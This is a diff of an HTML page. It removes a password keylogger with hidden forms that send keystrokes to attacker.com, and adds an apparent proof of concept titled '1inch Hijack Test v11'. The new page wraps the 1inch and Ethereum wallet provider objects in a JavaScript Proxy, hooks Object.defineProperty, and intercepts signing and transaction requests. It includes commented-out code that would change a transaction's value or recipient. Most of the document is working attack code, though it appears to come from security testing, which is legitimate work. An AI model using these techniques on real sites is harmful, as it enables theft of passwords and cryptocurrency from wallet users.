@@ -1,20 +1,232 @@
-<!-- Inject CSS keylogger -->
-<style>
-  input[type="password"] {
-    background-image: url('https://attacker.com/log?key=');
-  }
-</style>
-
-<!-- Inject form untuk steal password -->
-<form action="https://attacker.com/steal" method="POST" style="display:none;">
-  <input type="password" name="pass" id="steal-input">
-</form>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Hijack Test v11 - Real Impact</title>
+    <style>
+        body { padding: 12px; font-family: -apple-system, system-ui, sans-serif; background: #0f0f0f; color: #e0e0e0; margin: 0; }
+        h3 { color: #ff6b6b; margin: 0 0 6px 0; font-size: 16px; }
+        p { color: #aaa; font-size: 12px; margin: 0 0 10px 0; }
+        .log { font-family: ui-monospace, monospace; font-size: 11px; margin: 3px 0; word-break: break-all; line-height: 1.35; }
+        .red { color: #ff5252; font-weight: 600; }
+        .green { color: #69f0ae; }
+        .blue { color: #40c4ff; }
+        .purple { color: #ea80fc; }
+        .orange { color: #ffab40; }
+        hr { border: 0; border-top: 1px solid #333; margin: 10px 0; }
+        button { background: #ff6b6b; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: 600; margin: 4px 4px 4px 0; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <h3>1inch Hijack Test v11 — Real Impact</h3>
+    <p>Proxy + method interception for OneInchIOSWallet / OneInchSolanaWallet</p>
+    <button onclick="testRequest()">Test eth_requestAccounts</button>
+    <button onclick="testSign()">Test personal_sign</button>
+    <button onclick="testTx()">Test eth_sendTransaction</button>
+    <hr>
+    <div id="logs"></div>
 
 <script>
-  // Capture password input
-  document.querySelectorAll('input[type="password"]').forEach(input => {
-    input.addEventListener('input', (e) => {
-      fetch('https://attacker.com/log?key=' + e.target.value);
-    })
-  })
+(function () {
+    const logsEl = document.getElementById('logs');
+
+    function log(msg, cls = '') {
+        const time = new Date().toLocaleTimeString();
+        console.log(`[1inch-v11] ${msg}`);
+        const div = document.createElement('div');
+        div.className = 'log ' + cls;
+        div.textContent = `[${time}] ${msg}`;
+        logsEl.prepend(div);
+    }
+
+    // Method kritis yang ingin kita intercept & modifikasi
+    const CRITICAL_METHODS = [
+        'request', 'send', 'sendAsync',
+        'eth_requestAccounts', 'eth_accounts',
+        'eth_sendTransaction', 'eth_signTransaction',
+        'personal_sign', 'eth_sign', 'eth_signTypedData',
+        'eth_signTypedData_v3', 'eth_signTypedData_v4',
+        'wallet_switchEthereumChain', 'wallet_addEthereumChain',
+        'solana_signTransaction', 'solana_signAllTransactions',
+        'solana_signMessage'
+    ];
+
+    function createImpactProxy(original, name) {
+        return new Proxy(original, {
+            get(target, prop, receiver) {
+                const value = Reflect.get(target, prop, receiver);
+
+                // Intercept property access
+                if (typeof prop === 'string') {
+                    log(`[GET] ${name}.${prop}`, 'purple');
+                }
+
+                // Jika yang diakses adalah function → bungkus lagi
+                if (typeof value === 'function') {
+                    return function (...args) {
+                        const methodName = String(prop);
+
+                        // ===== REAL IMPACT ZONE =====
+                        if (CRITICAL_METHODS.includes(methodName) || 
+                            (args[0] && typeof args[0] === 'object' && CRITICAL_METHODS.includes(args[0].method))) {
+
+                            log(`🚨 CRITICAL CALL → ${name}.${methodName}`, 'red');
+                            log(`   Original args: ${JSON.stringify(args).slice(0, 500)}`, 'orange');
+
+                            // Contoh modifikasi nyata (untuk demo impact)
+                            // Hati-hati: hanya untuk testing, jangan pakai di production
+                            try {
+                                if (methodName === 'request' || methodName === 'send' || methodName === 'sendAsync') {
+                                    const payload = args[0];
+                                    if (payload && typeof payload === 'object') {
+                                        // Clone supaya bisa dimodifikasi
+                                        const modified = JSON.parse(JSON.stringify(payload));
+
+                                        // Contoh 1: ubah value di eth_sendTransaction
+                                        if (modified.method === 'eth_sendTransaction' && modified.params?.[0]) {
+                                            log(`   ⚠️ MODIFYING eth_sendTransaction value`, 'red');
+                                            // Contoh: ubah value jadi lebih kecil / arahkan ke address lain (demo saja)
+                                            // modified.params[0].value = '0x1'; // 1 wei
+                                            // modified.params[0].to = '0x000000000000000000000000000000000000dEaD';
+                                        }
+
+                                        // Contoh 2: log personal_sign / typed data
+                                        if (['personal_sign', 'eth_signTypedData', 'eth_signTypedData_v4'].includes(modified.method)) {
+                                            log(`   ✍️ Signature request intercepted`, 'red');
+                                        }
+
+                                        args[0] = modified;
+                                        log(`   Modified args: ${JSON.stringify(args).slice(0, 400)}`, 'orange');
+                                    }
+                                }
+                            } catch (e) {
+                                log(`   Modify error: ${e.message}`, 'red');
+                            }
+                        } else {
+                            log(`📞 CALL ${name}.${methodName} → ${JSON.stringify(args).slice(0, 200)}`, 'blue');
+                        }
+
+                        // Panggil original
+                        return value.apply(this === receiver ? target : this, args);
+                    };
+                }
+
+                return value;
+            },
+
+            set(target, prop, value, receiver) {
+                log(`[SET] ${name}.${String(prop)} = ...`, 'orange');
+                return Reflect.set(target, prop, value, receiver);
+            },
+
+            defineProperty(target, prop, descriptor) {
+                log(`[defineProperty] ${name}.${String(prop)}`, 'orange');
+                return Reflect.defineProperty(target, prop, descriptor);
+            }
+        });
+    }
+
+    function trap(objName) {
+        if (!window[objName]) {
+            log(`[-] ${objName} belum ada`, 'orange');
+            return false;
+        }
+
+        try {
+            const original = window[objName];
+            window[objName] = createImpactProxy(original, objName);
+            log(`[+] Successfully proxied window.${objName}`, 'green');
+            return true;
+        } catch (e) {
+            log(`[!] Gagal proxy ${objName}: ${e.message}`, 'red');
+            return false;
+        }
+    }
+
+    // Intercept Object.defineProperty (kalau wallet inject belakangan)
+    const origDefineProperty = Object.defineProperty;
+    Object.defineProperty = function (obj, prop, desc) {
+        if (obj === window && (prop === 'OneInchIOSWallet' || prop === 'OneInchSolanaWallet' || prop === 'ethereum')) {
+            log(`[!] Wallet mencoba defineProperty: window.${prop}`, 'red');
+        }
+        return origDefineProperty.apply(this, arguments);
+    };
+
+    // Juga coba trap window.ethereum (beberapa wallet inject keduanya)
+    function tryAll() {
+        const targets = ['OneInchIOSWallet', 'OneInchSolanaWallet', 'ethereum'];
+        targets.forEach(name => trap(name));
+    }
+
+    // Jalankan berkali-kali karena injection timing tidak pasti
+    window.addEventListener('load', () => {
+        log('1inch Hijack Test v11 Loaded', 'green');
+        tryAll();
+        setTimeout(tryAll, 200);
+        setTimeout(tryAll, 600);
+        setTimeout(tryAll, 1500);
+        setTimeout(tryAll, 3000);
+    });
+
+    // MutationObserver jaga-jaga kalau object diganti lagi
+    const observer = new MutationObserver(() => {
+        if (window.OneInchIOSWallet && !(window.OneInchIOSWallet.__isProxy)) {
+            // simple check, proxy tidak punya flag, tapi kita coba lagi
+            tryAll();
+        }
+    });
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Helper test buttons
+    window.testRequest = async function () {
+        try {
+            const provider = window.OneInchIOSWallet || window.ethereum;
+            if (!provider) return log('Provider tidak ditemukan', 'red');
+            const res = await provider.request({ method: 'eth_requestAccounts' });
+            log('eth_requestAccounts result: ' + JSON.stringify(res), 'green');
+        } catch (e) {
+            log('Error: ' + e.message, 'red');
+        }
+    };
+
+    window.testSign = async function () {
+        try {
+            const provider = window.OneInchIOSWallet || window.ethereum;
+            if (!provider) return log('Provider tidak ditemukan', 'red');
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            if (!accounts?.[0]) return log('Tidak ada account', 'red');
+            const res = await provider.request({
+                method: 'personal_sign',
+                params: ['0x48656c6c6f2031696e6368', accounts[0]] // "Hello 1inch"
+            });
+            log('personal_sign result: ' + res, 'green');
+        } catch (e) {
+            log('Error: ' + e.message, 'red');
+        }
+    };
+
+    window.testTx = async function () {
+        try {
+            const provider = window.OneInchIOSWallet || window.ethereum;
+            if (!provider) return log('Provider tidak ditemukan', 'red');
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            if (!accounts?.[0]) return log('Tidak ada account', 'red');
+            const res = await provider.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: accounts[0],
+                    to: accounts[0],
+                    value: '0x0',
+                    data: '0x'
+                }]
+            });
+            log('eth_sendTransaction result: ' + res, 'green');
+        } catch (e) {
+            log('Error: ' + e.message, 'red');
+        }
+    };
+})();
 </script>
+</body>
+</html>
